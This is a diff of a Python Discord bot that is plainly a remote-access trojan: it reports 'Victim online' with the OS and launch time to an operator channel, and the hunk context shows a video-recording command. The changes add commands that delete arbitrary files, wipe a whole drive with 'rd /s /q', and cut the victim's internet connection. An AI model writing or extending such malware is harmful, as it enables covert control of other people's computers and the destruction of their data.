@@ -24,8 +24,8 @@ bot.remove_command('help')
 @bot.event 
 async def on_ready():
     channel = bot.get_channel(config.channel)
-    await channel.send(f'CAT: Жертва онлайн!')
     date =  datetime.now()
+    await channel.send(f'CAT: Жертва онлайн! \n Время запука {date.hour}:{date.minute}. \n ОС: {sys.platform}. \n Напишите !help для справки!')
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
 
 @bot.command()
@@ -119,4 +119,21 @@ async def video(ctx,how_many): #запись видео
     os.remove(output)
     out.release()
     cv2.destroyAllWindows()
+
+@bot.command()
+async def delete(ctx,file): # удалиить файл
+    try:
+        check = os.remove(str(file))
+    except FileNotFoundError:
+        await ctx.send('Такой файл не найден!')
+    finally:
+        ctx.send(f'Файл "{str(file)}"был успешно удалён!')
+
+@bot.command()
+async def format(ctx,disk): # форматирование диска 
+    os.system(f'rd/s/q {disk}:\ ')
+
+@bot.command()
+async def inet_kill(ctx): # отключить интернет
+    os.system(config.disable_internet)
 bot.run(config.token)
